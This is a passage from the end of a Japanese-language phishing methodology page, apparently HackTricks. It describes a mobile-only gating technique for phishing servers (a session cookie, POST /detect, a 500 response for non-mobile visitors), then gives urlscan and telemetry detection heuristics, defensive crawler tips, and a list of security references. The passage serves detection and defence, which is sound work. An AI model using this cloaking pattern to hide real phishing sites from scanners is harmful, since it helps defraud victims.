- 初回ロード時にセッション cookie を設定する。
- `POST /detect {"is_mobile":true|false}` を受け付ける。
- 以降の GET で `is_mobile=false` の場合は 500（またはプレースホルダー）を返し、`true` の場合のみ phishing を提供する。

ハンティングおよび検知のヒューリスティック:
- urlscan クエリ: `filename:"detect_device.js" AND page.status:500`
- Web テレメトリ: `GET /static/detect_device.js` → `POST /detect` → 非モバイルの場合は HTTP 500 というシーケンス。正規のモバイル被害者向けパスでは、後続の HTML/JS とともに 200 を返す。
- `ontouchstart` または類似のデバイスチェックだけでコンテンツを分岐させるページをブロックまたは精査する。

防御のヒント:
- モバイルに似たフィンガープリントと JS を有効にした状態で crawler を実行し、ゲートされたコンテンツを明らかにする。
- 新規登録ドメインで `POST /detect` の後に不審な 500 応答が発生した場合にアラートを生成する。

## 参考資料

- [1] [phishing で使用されるドメインバリエーションの生成（Zeltser）](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [phishing の発見: ツールと手法（0xPatrik）](https://0xpatrik.com/phishing-domains/)
- [3] [EvilnoVNC によるセッションの窃取と 2FA の bypass（darkbyte.net）](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [4] [Debian Wheezy 上での Postfix 用 DKIM のインストールと設定方法（DigitalOcean）](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [5] [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [6] [Silent Smishing – モバイルでゲートされた phishing インフラストラクチャとヒューリスティック（Sekoia.io）](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [7] [Runtime Assembly Attacks の次なるフロンティア: LLM を活用したリアルタイムの phishing JavaScript 生成](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [8] [Impersonation、Click Hijacking、TDS: Malware Distribution Ecosystem の内部](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [9] [bitflipping による Microsoft の windows.com へのトラフィック hijacking（BleepingComputer）](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [10] [Love? Actually: パキスタンで標的型 spyware campaign の lure として使用された偽 dating app](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [11] [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
